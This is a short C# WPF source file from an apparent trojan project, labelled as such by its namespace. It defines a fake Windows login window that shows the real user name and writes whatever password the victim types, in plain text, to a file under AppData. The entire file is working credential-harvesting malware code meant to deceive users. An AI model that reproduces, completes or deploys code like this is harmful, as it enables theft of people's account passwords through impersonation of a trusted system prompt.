using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Input;

namespace Trojan.Views
{
    public partial class FakeLoginWindow : Window
    {
        public FakeLoginWindow()
        {
            InitializeComponent();

            UsernameText.Text = Environment.UserName;

            
        }

        private void PinBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                Close();
            }
        }

        private void LoginButton_Click(object sender, RoutedEventArgs e)
        {
            SaveToTxt();
            Close();
        }
        private void SaveToTxt()
        {
            string folder = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "gnezdece"
            );

            Directory.CreateDirectory(folder);

            string path = Path.Combine(folder, "password.txt");

            File.AppendAllText(path, password.Password + Environment.NewLine);


            if (!File.Exists(path))
            {
                File.WriteAllText(path, password.Password);
            }
        }
    }
}
